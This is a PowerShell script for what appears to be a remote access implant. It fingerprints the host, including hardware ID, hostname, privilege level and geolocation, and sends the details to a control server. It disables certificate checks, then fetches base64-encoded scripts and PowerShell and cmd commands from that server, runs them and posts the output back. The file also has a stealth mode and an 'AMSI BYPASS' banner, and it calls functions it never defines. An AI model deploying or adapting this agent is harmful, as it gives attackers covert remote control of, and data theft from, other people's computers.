# DEBUG MODE DETECTION - Check if this is a Debug execution
$global:debug_mode = $true
$persistenceFlag = Join-Path $env:APPDATA 'Cosmali\.debug'

if (Test-Path $persistenceFlag) {
    $global:debug_mode = $false
    Write-Host "[DEBUG] Debug mode detected" -ForegroundColor DarkGray
} else {
    Write-Host "[DEBUG] Starting script execution..." -ForegroundColor Cyan
}

# Only show visible output if not in stealth mode
if (-not $global:debug_mode) {
    Write-Host "[*] ----AMSI BYPASS STARTED----"
}



$global:ip_port = "127.0.0.1:5000"
$global:id = get-wmiobject Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID
$global:ping_timer = 15
$global:job_timeout = 10

if (-not $global:debug_mode) {
    Write-Host "[DEBUG] Global variables set:" -ForegroundColor Cyan
    Write-Host "[DEBUG] IP:Port = $($global:ip_port)" -ForegroundColor Cyan
    Write-Host "[DEBUG] UUID = $($global:id)" -ForegroundColor Cyan
    Write-Host "[DEBUG] User Level = $($global:user_level)" -ForegroundColor Cyan
    Write-Host "[DEBUG] Ping timer = $($global:ping_timer)" -ForegroundColor Cyan
    Write-Host "[DEBUG] Job timeout = $($global:job_timeout)" -ForegroundColor Cyan
}


#network vars
$global:countrycode = ""
$global:lat = ""
$global:lon = ""

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = 'SilentlyContinue'

if (-not $global:debug_mode) {
    Write-Host "[DEBUG] Setting security protocols..." -ForegroundColor Cyan
}
[System.Net.ServicePointManager]::SecurityProtocol = "Tls, Tls11, Tls12, Ssl3"

# Proper SSL certificate validation bypass
class TrustAllCertsPolicy : System.Net.ICertificatePolicy {
    [bool] CheckValidationResult([System.Net.ServicePoint] $a,[System.Security.Cryptography.X509Certificates.X509Certificate] $b,[System.Net.WebRequest] $c,[int] $d) {
        return $true
    }
}
[System.Net.ServicePointManager]::CertificatePolicy = [TrustAllCertsPolicy]::new()

# Configure connection settings for better stability
[System.Net.ServicePointManager]::DefaultConnectionLimit = 10
[System.Net.ServicePointManager]::MaxServicePointIdleTime = 10000
[System.Net.ServicePointManager]::Expect100Continue = $false
[System.Net.ServicePointManager]::UseNagleAlgorithm = $false

# Force connection reuse and keep-alive
[System.Net.ServicePointManager]::CheckCertificateRevocationList = $false
[System.Net.ServicePointManager]::DnsRefreshTimeout = 30000

# Create a custom WebClient with keep-alive headers
function New-WebClientWithKeepAlive {
    $client = New-Object System.Net.WebClient
    $client.Headers.Add("Connection", "keep-alive")
    $client.Headers.Add("Keep-Alive", "timeout=30, max=100")
    $client.Headers.Add("User-Agent", "PowerShell-Agent/1.0")
    return $client
}

# Enhanced web request function with better connection handling
function Invoke-RobustWebRequest {
    param(
        [string]$Uri,
        [string]$Method = "GET",
        [string]$Body = $null,
        [string]$ContentType = "application/json",
        [int]$TimeoutSec = 30,
        [int]$MaxRetries = 3
    )
    
    $retryCount = 0
    while ($retryCount -lt $MaxRetries) {
        try {
            # Create request with proper headers
            $request = [System.Net.WebRequest]::Create($Uri)
            $request.Method = $Method
            $request.Timeout = $TimeoutSec * 1000
            $request.Headers.Add("Connection", "keep-alive")
            $request.Headers.Add("Keep-Alive", "timeout=30, max=100")
            $request.Headers.Add("User-Agent", "PowerShell-Agent/1.0")
            
            if ($Body) {
                $request.ContentType = $ContentType
                $request.ContentLength = [System.Text.Encoding]::UTF8.GetByteCount($Body)
                $stream = $request.GetRequestStream()
                $bytes = [System.Text.Encoding]::UTF8.GetBytes($Body)
                $stream.Write($bytes, 0, $bytes.Length)
                $stream.Close()
            }
            
            # Get response
            $response = $request.GetResponse()
            $reader = New-Object System.IO.StreamReader($response.GetResponseStream())
            $content = $reader.ReadToEnd()
            $reader.Close()
            $response.Close()
            
            return $content
        }
        catch {
            $retryCount++
            $errorMsg = $_.Exception.Message
            if (-not $global:debug_mode) {
                Write-Host "[-] Web request failed (attempt $retryCount/$MaxRetries): $errorMsg" -ForegroundColor Red
            }
            
            if ($retryCount -lt $MaxRetries) {
                if (-not $global:debug_mode) {
                    Write-Host "[DEBUG] Retrying web request in 2 seconds..." -ForegroundColor Yellow
                }
                Start-Sleep -Seconds 2
            } else {
                throw
            }
        }
    }
}    

if (-not $global:debug_mode) {
    Write-Host "[DEBUG] Security protocols and certificate policy configured" -ForegroundColor Cyan
}

# Test basic connectivity before proceeding
if (-not $global:debug_mode) {
    Write-Host "[DEBUG] Testing basic connectivity to backend..." -ForegroundColor Cyan
}
try {
    $testUri = "https://$global:ip_port"
    if (-not $global:debug_mode) {
        Write-Host "[DEBUG] Testing connection to: $testUri" -ForegroundColor Cyan
    }
    
    # Simple connectivity test
    $testResponse = Invoke-WebRequest -Uri $testUri -Method HEAD -UseBasicParsing -TimeoutSec 10 -ErrorAction Stop
    if (-not $global:debug_mode) {
        Write-Host "[DEBUG] Basic connectivity test successful - Status: $($testResponse.StatusCode)" -ForegroundColor Green
    }
} catch {
    if (-not $global:debug_mode) {
        Write-Host "[-] Basic connectivity test failed: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "[DEBUG] This indicates a network or backend issue" -ForegroundColor Yellow
        Write-Host "[DEBUG] Continuing anyway to attempt full connection..." -ForegroundColor Cyan
    }
}

function Get-Info {
    if (-not $global:debug_mode) {
        Write-Host "[DEBUG] Get-Info function called" -ForegroundColor Cyan
    }
    if ($global:countrycode -eq "" -or $global:lat -eq "" -or $global:lon -eq "") {
        if (-not $global:debug_mode) {
            Write-Host "[DEBUG] Fetching geolocation data..." -ForegroundColor Cyan
        }
        try {
            $req = Invoke-WebRequest -Uri "http://ip-api.com/json" -useb
            if ($req.StatusCode -eq 200) {
                $global:countrycode = ($req.Content | ConvertFrom-Json).countryCode
                $global:lat = ($req.Content | ConvertFrom-Json).lat
                $global:lon = ($req.Content | ConvertFrom-Json).lon
                if (-not $global:debug_mode) {
                    Write-Host "[DEBUG] Geolocation data retrieved: $($global:countrycode), $($global:lat), $($global:lon)" -ForegroundColor Green
                }
            } else {
                if (-not $global:debug_mode) {
                    Write-Host "[DEBUG] Geolocation request failed with status: $($req.StatusCode)" -ForegroundColor Yellow
                }
                Start-Sleep -Seconds 100
                Get-Info
            }
        } catch {
            if (-not $global:debug_mode) {
                Write-Host "[-] Geolocation request failed: $($_.Exception.Message)" -ForegroundColor Red
            }
        }
    }

    $jsonData = @{
        "PCINFO" = @{
            'hwid' = $global:id
            'country_code' = $global:countrycode
            'hostname' = $env:COMPUTERNAME
            'date' = (Get-Date).ToString()
            'lat' = $global:lat
            'lon' = $global:lon
            'elevated_status' = $global:user_level
        }
    }

    if (-not $global:debug_mode) {
        Write-Host "[DEBUG] PCINFO data prepared" -ForegroundColor Cyan
    }
    return $jsonData
}

function Main {
    if (-not $global:debug_mode) {
        Write-Host "[DEBUG] Main function started" -ForegroundColor Cyan
    }
    try {
        # Test network connectivity first
        if (-not $global:debug_mode) {
            Write-Host "[DEBUG] Testing network connectivity..." -ForegroundColor Cyan
        }
        try {
            $null = Invoke-WebRequest -Uri "https://$global:ip_port" -Method HEAD -UseBasicParsing -TimeoutSec 10 -ErrorAction Stop
            if (-not $global:debug_mode) {
                Write-Host "[DEBUG] Network connectivity test successful" -ForegroundColor Green
            }
        } catch {
            if (-not $global:debug_mode) {
                Write-Host "[-] Network connectivity test failed: $($_.Exception.Message)" -ForegroundColor Red
                Write-Host "[DEBUG] This might indicate a network issue or backend is down" -ForegroundColor Yellow
            }
        }

        Invoke-InitialConnection
        if (-not $global:debug_mode) {
            Write-Host "[DEBUG] Initial connection established, starting main loop" -ForegroundColor Green
        }
        
        $loopCount = 0
        $consecutiveFailures = 0
        $maxFailures = 5
        
        while ($true) {
            $loopCount++
            if (-not $global:debug_mode) {
                Write-Host "[DEBUG] Main loop iteration: $loopCount" -ForegroundColor Cyan
            }
            
            # Check for termination flag before each iteration
            $terminationFlag = "$env:TEMP\$($global:id).flag"
            if (Test-Path $terminationFlag) {
                $flagAgeSeconds = (New-TimeSpan -Start (Get-Item $terminationFlag).LastWriteTime -End (Get-Date)).TotalSeconds
                if ($flagAgeSeconds -lt 60) {
                    if (-not $global:debug_mode) {
                        Write-Host "[DEBUG] Termination flag detected: $terminationFlag (age: $([math]::Round($flagAgeSeconds,2)) seconds)" -ForegroundColor Red
                        Write-Host "[DEBUG] Agent is being terminated by server request" -ForegroundColor Red
                    }
                    try {
                        Remove-Item $terminationFlag -Force -ErrorAction SilentlyContinue
                        if (-not $global:debug_mode) {
                            Write-Host "[DEBUG] Termination flag removed" -ForegroundColor Red
                        }
                    } catch {
                        if (-not $global:debug_mode) {
                            Write-Host "[DEBUG] Could not remove termination flag: $($_.Exception.Message)" -ForegroundColor Yellow
                        }
                    }
                    if (-not $global:debug_mode) {
                        Write-Host "[DEBUG] Exiting agent gracefully..." -ForegroundColor Red
                    }
                    exit 0
                } else {
                    if (-not $global:debug_mode) {
                        Write-Host "[DEBUG] Termination flag detected but too old (age: $([math]::Round($flagAgeSeconds,2)) seconds), ignoring..." -ForegroundColor Yellow
                    }
                }
            }
            
            try {
                Invoke-CheckForCommands
                $consecutiveFailures = 0  # Reset failure counter on success
                if (-not $global:debug_mode) {
                    Write-Host "[DEBUG] Command check completed, waiting $($global:ping_timer) seconds..." -ForegroundColor Cyan
                }
            } 
            catch {
                $consecutiveFailures++
                $errorMsg = $_.Exception.Message
                if (-not $global:debug_mode) {
                    Write-Host "[-] Command check failed in iteration $loopCount`:$errorMsg" -ForegroundColor Red
                }
                
                if ($consecutiveFailures -ge $maxFailures) {
                    if (-not $global:debug_mode) {
                        Write-Host "[!] Too many consecutive failures ($consecutiveFailures), attempting to reconnect..." -ForegroundColor Yellow
                    }
                    try {
                        Invoke-InitialConnection
                        $consecutiveFailures = 0
                        if (-not $global:debug_mode) {
                            Write-Host "[DEBUG] Reconnection successful" -ForegroundColor Green
                        }
                    } 
                    catch {
                        $reconnectError = $_.Exception.Message
                        if (-not $global:debug_mode) {
                            Write-Host "[-] Reconnection failed: $reconnectError" -ForegroundColor Red
                        }
                    }
                }
                
                if (-not $global:debug_mode) {
                    Write-Host "[DEBUG] Waiting $($global:ping_timer) seconds before next attempt..." -ForegroundColor Cyan
                }
            }
            
            Start-Sleep -Seconds $global:ping_timer
        }
    } catch {
        if (-not $global:debug_mode) {
            Write-Host "[-] Main function crashed: $($_.Exception.Message)" -ForegroundColor Red
            Write-Host "[-] Stack trace: $($_.ScriptStackTrace)" -ForegroundColor Red
        }
        throw
    }
}

function LoadScript {
    param (
        [String]$base64_script
    )

    if (-not $global:debug_mode) {
        Write-Host "[DEBUG] LoadScript called with script length: $($base64_script.Length)" -ForegroundColor Cyan
    }
    
    try {
        $block = [Scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64_script)))
        if (-not $global:debug_mode) {
            Write-Host "[DEBUG] Script block created successfully" -ForegroundColor Green
        }
        
        $null = Start-Job -ScriptBlock $block -ArgumentList $global:ip_port, $global:id | Wait-Job -Timeout $global:job_timeout
        if (-not $global:debug_mode) {
            Write-Host "[DEBUG] Job completed with timeout: $global:job_timeout" -ForegroundColor Green
        }
    }
    catch {
        if (-not $global:debug_mode) {
            Write-Host "[-] LoadScript failed: $($_.Exception.Message)" -ForegroundColor Red
            Write-Host "[-] Stack trace: $($_.ScriptStackTrace)" -ForegroundColor Red
        }
    }
}

function Invoke-InitialConnection {
    if (-not $global:debug_mode) {
        Write-Host "[DEBUG] Invoke-InitialConnection started" -ForegroundColor Cyan
    }
    $went_through = $false
    $attemptCount = 0
    
    while ($went_through -eq $false) {
        $attemptCount++
        if (-not $global:debug_mode) {
            Write-Host "[DEBUG] Connection attempt: $attemptCount" -ForegroundColor Cyan
        }
        
        try {
            $jsonData = Get-Info | ConvertTo-Json
            $base64_id = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($global:id))
            
            if (-not $global:debug_mode) {
                Write-Host "[DEBUG] Attempting connection to: https://$global:ip_port/api/client/$base64_id" -ForegroundColor Cyan
            }
            
            $responseContent = Invoke-RobustWebRequest -Uri "https://$global:ip_port/api/client/$base64_id" -Method POST -Body $jsonData -ContentType "application/json" -TimeoutSec 30 -MaxRetries 3

            if ($responseContent) {
                if (-not $global:debug_mode) {
                    Write-Host "[DEBUG] Connection successful!" -ForegroundColor Green
                }
                $went_through = $true
                $outData = $responseContent | ConvertFrom-Json

                if (-not $global:debug_mode) {
                    Write-Host "[DEBUG] Response data: $($outData | ConvertTo-Json)" -ForegroundColor Cyan
                }

                # Check if this is a new user with auto-load scripts
                if ($outData.user_type -eq "new" -and $outData.auto_load -eq $true -and $outData.auto_load_script -and $outData.auto_load_script.Count -gt 0) {
                    if (-not $global:debug_mode) {
                        Write-Host "[DEBUG] Processing $($outData.auto_load_script.Count) auto-load scripts" -ForegroundColor Cyan
                    }
                    foreach ($script in $outData.auto_load_script) {
                        LoadScript -base64_script $script
                    }
                } else {
                    if (-not $global:debug_mode) {
                        Write-Host "[DEBUG] No auto-load scripts to process" -ForegroundColor Cyan
                    }
                }

                # Note: new_run scripts are only returned on GET requests, not POST
                if (-not $global:debug_mode) {
                    Write-Host "[DEBUG] Initial connection completed, will check for commands in main loop" -ForegroundColor Green
                }
            }
        }
        catch {
            if (-not $global:debug_mode) {
                Write-Host "[-] Connection attempt $attemptCount failed: $($_.Exception.Message)" -ForegroundColor Red
                Write-Host "[DEBUG] Waiting 10 seconds before retry..." -ForegroundColor Cyan
            }
            Start-Sleep -Seconds 10
        }
    }
    
    if (-not $global:debug_mode) {
        Write-Host "[DEBUG] Initial connection established successfully" -ForegroundColor Green
    }
}

function Invoke-CheckForCommands {
    if (-not $global:debug_mode) {
        Write-Host "[DEBUG] Invoke-CheckForCommands called" -ForegroundColor Cyan
    }
    
    # Check for termination flag before making network requests
    $terminationFlag = "$env:TEMP\$($global:id).flag"
    if (Test-Path $terminationFlag) {
        if (-not $global:debug_mode) {
            Write-Host "[DEBUG] Termination flag detected in command check" -ForegroundColor Red
            Write-Host "[DEBUG] Agent is being terminated by server request" -ForegroundColor Red
        }
        try {
            Remove-Item $terminationFlag -Force -ErrorAction SilentlyContinue
            if (-not $global:debug_mode) {
                Write-Host "[DEBUG] Termination flag removed" -ForegroundColor Red
            }
        } catch {
            if (-not $global:debug_mode) {
                Write-Host "[DEBUG] Could not remove termination flag: $($_.Exception.Message)" -ForegroundColor Yellow
            }
        }
        if (-not $global:debug_mode) {
            Write-Host "[DEBUG] Exiting agent gracefully..." -ForegroundColor Red
        }
        exit 0
    }
    
    try {
        $base64_id = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($global:id))
        if (-not $global:debug_mode) {
            Write-Host "[DEBUG] Checking for commands with ID: $base64_id" -ForegroundColor Cyan
        }
        
        $responseContent = Invoke-RobustWebRequest -Uri "https://$global:ip_port/api/client/$base64_id" -Method GET -TimeoutSec 30 -MaxRetries 3
        
        if ($responseContent) {
            if (-not $global:debug_mode) {
                Write-Host "[DEBUG] Command check successful" -ForegroundColor Green
            }
            $outData = $responseContent | ConvertFrom-Json

            # ADD DEBUG LOGGING TO SEE THE FULL RESPONSE
            if (-not $global:debug_mode) {
                Write-Host "[DEBUG] Full response: $responseContent" -ForegroundColor Magenta
                Write-Host "[DEBUG] Response keys: $($outData.PSObject.Properties.Name)" -ForegroundColor Cyan
            }

            # Check for new scripts to execute
            if ($outData.new_run -eq $true -and $outData.scripts.Count -gt 0) {
                if (-not $global:debug_mode) {
                    Write-Host "[DEBUG] Found $($outData.scripts.Count) new scripts to execute" -ForegroundColor Cyan
                }
                foreach ($script in $outData.scripts) {
                    LoadScript -base64_script $script
                }
            } else {
                if (-not $global:debug_mode) {
                    Write-Host "[DEBUG] No new scripts to execute" -ForegroundColor Cyan
                }
            }

            # Check for console commands
            if ($outData.console_commands -and $outData.console_commands.Count -gt 0) {
                if (-not $global:debug_mode) {
                    Write-Host "[DEBUG] Found $($outData.console_commands.Count) console commands to execute" -ForegroundColor Cyan
                }
                foreach ($cmd in $outData.console_commands) {
                    if (-not $global:debug_mode) {
                        Write-Host "[DEBUG] Executing console command: $($cmd.command)" -ForegroundColor Yellow
                    }
                    
                    try {
                        # Execute the command based on shell type
                        if ($cmd.shell_type -eq "powershell") {
                            if (-not $global:debug_mode) {
                                Write-Host "[DEBUG] Executing PowerShell command: $($cmd.command)" -ForegroundColor Green
                            }
                            $output = Invoke-Expression $cmd.command 2>&1 | Out-String
                        } elseif ($cmd.shell_type -eq "cmd") {
                            if (-not $global:debug_mode) {
                                Write-Host "[DEBUG] Executing CMD command: $($cmd.command)" -ForegroundColor Green
                            }
                            # Use simple cmd /c with timeout wrapper
                            try {
                                $output = ""
                                
                                # Execute CMD command with timeout using job
                                $job = Start-Job -ScriptBlock { 
                                    param($cmd)
                                    $result = cmd /c $cmd 2>&1
                                    # Convert to string and clean up
                                    $result | Out-String -Width 4096
                                } -ArgumentList $cmd.command
                                
                                # Wait for job with timeout
                                if (Wait-Job $job -Timeout 10) {
                                    $rawOutput = Receive-Job $job
                                    Remove-Job $job -Force
                                    
                                    # Ensure we get a clean string
                                    if ($rawOutput -is [System.Management.Automation.PSCustomObject]) {
                                        $output = $rawOutput.ToString()
                                    } elseif ($rawOutput -is [array]) {
                                        $output = $rawOutput -join "`n"
                                    } else {
                                        $output = [string]$rawOutput
                                    }
                                    
                                    # Clean up any PowerShell artifacts
                                    $output = $output -replace '\r\n', "`n" -replace '\r', "`n"
                                    $output = $output.Trim()
                                    
                                    if (-not $global:debug_mode) {
                                        Write-Host "[DEBUG] CMD command completed successfully" -ForegroundColor Green
                                        Write-Host "[DEBUG] Cleaned output: $output" -ForegroundColor Cyan
                                    }
                                } else {
                                    # Job timed out
                                    Stop-Job $job -Force
                                    Remove-Job $job -Force
                                    $output = "Command execution timed out after 10 seconds"
                                    if (-not $global:debug_mode) {
                                        Write-Host "[DEBUG] CMD command timed out" -ForegroundColor Red
                                    }
                                }
                                
                            } catch {
                                $output = "CMD execution error: $($_.Exception.Message)"
                                if (-not $global:debug_mode) {
                                    Write-Host "[DEBUG] CMD execution exception: $($_.Exception.Message)" -ForegroundColor Red
                                }
                            }
                        } else {
                            $output = "Unsupported shell type: $($cmd.shell_type)"
                        }
                        
                        if (-not $global:debug_mode) {
                            Write-Host "[DEBUG] Command output: $output" -ForegroundColor Cyan
                        }
                        
                        # Send the output back to the backend
                        $outputData = @{
                            "command_id" = $cmd.id
                            "output" = $output
                            "status" = "completed"
                            "HWID" = $global:id
                        }
                        
                        $outputJson = $outputData | ConvertTo-Json -Compress
                        
                        # Ensure proper UTF-8 encoding
                        $outputBytes = [System.Text.Encoding]::UTF8.GetBytes($outputJson)
                        $outputJson = [System.Text.Encoding]::UTF8.GetString($outputBytes)
                        
                        if (-not $global:debug_mode) {
                            Write-Host "[DEBUG] Sending JSON data: $outputJson" -ForegroundColor Cyan
                        }
                        
                        $outputResponse = Invoke-RobustWebRequest -Uri "https://$global:ip_port/console/output" -Method POST -Body $outputJson -ContentType "application/json; charset=utf-8" -TimeoutSec 30 -MaxRetries 2
                        
                        if ($outputResponse) {
                            if (-not $global:debug_mode) {
                                Write-Host "[DEBUG] Console command output sent successfully" -ForegroundColor Green
                            }
                        } else {
                            if (-not $global:debug_mode) {
                                Write-Host "[-] Failed to send console command output" -ForegroundColor Red
                            }
                        }
                        
                    } catch {
                        if (-not $global:debug_mode) {
                            Write-Host "[-] Console command execution failed: $($_.Exception.Message)" -ForegroundColor Red
                        }
                        
                        # Send error status back
                        $errorData = @{
                            "command_id" = $cmd.id
                            "output" = "Error: $($_.Exception.Message)"
                            "status" = "error"
                            "HWID" = $global:id
                        }
                        
                        $errorJson = $errorData | ConvertTo-Json -Compress
                        
                        # Ensure proper UTF-8 encoding
                        $errorBytes = [System.Text.Encoding]::UTF8.GetBytes($errorJson)
                        $errorJson = [System.Text.Encoding]::UTF8.GetString($errorBytes)
                        
                        try {
                            $null = Invoke-RobustWebRequest -Uri "https://$global:ip_port/console/output" -Method POST -Body $errorJson -ContentType "application/json; charset=utf-8" -TimeoutSec 30 -MaxRetries 2
                        } catch {
                            if (-not $global:debug_mode) {
                                Write-Host "[-] Failed to send error status" -ForegroundColor Red
                            }
                        }
                    }
                }
            } else {
                if (-not $global:debug_mode) {
                    Write-Host "[DEBUG] No console commands to execute" -ForegroundColor Cyan
                    # ADD DEBUG LOGGING TO SEE WHAT'S MISSING
                    Write-Host "[DEBUG] console_commands field: $($outData.console_commands)" -ForegroundColor Yellow
                    Write-Host "[DEBUG] console_commands type: $($outData.console_commands.GetType().Name)" -ForegroundColor Yellow
                }
            }
        }
    }
    catch {
        if (-not $global:debug_mode) {
            Write-Host "[-] Command check failed: $($_.Exception.Message)" -ForegroundColor Red
        }
        throw
    }
}

function ClearPowershell {
    if (-not $global:debug_mode) {
        Write-Host "[DEBUG] ClearPowershell called" -ForegroundColor Cyan
    }
    #Get-Process powershell -ErrorAction SilentlyContinue | ForEach-Object { if ($pid -ne $_.ID) { Stop-Process -Force -Id $_.ID } }
}

function ClearJobs {
    if (-not $global:debug_mode) {
        Write-Host "[DEBUG] ClearJobs called" -ForegroundColor Cyan
    }
    try {
        Get-Job | Remove-Job -Force
        if (-not $global:debug_mode) {
            Write-Host "[DEBUG] Jobs cleared successfully" -ForegroundColor Green
        }
    } catch {
        if (-not $global:debug_mode) {
            Write-Host "[-] ClearJobs failed: $($_.Exception.Message)" -ForegroundColor Red
        }
    }
}


# Enable enhanced stealth mode if needed
Enable-StealthMode

if (-not $global:debug_mode) {
    Write-Host "[DEBUG] All functions defined, starting main execution..." -ForegroundColor Cyan
}

try {
    Main
} catch {
    if (-not $global:debug_mode) {
        Write-Host "[-] Script execution failed in Main: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "[-] Stack trace: $($_.ScriptStackTrace)" -ForegroundColor Red
        Write-Host "[DEBUG] Press any key to exit..." -ForegroundColor Cyan
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    }
}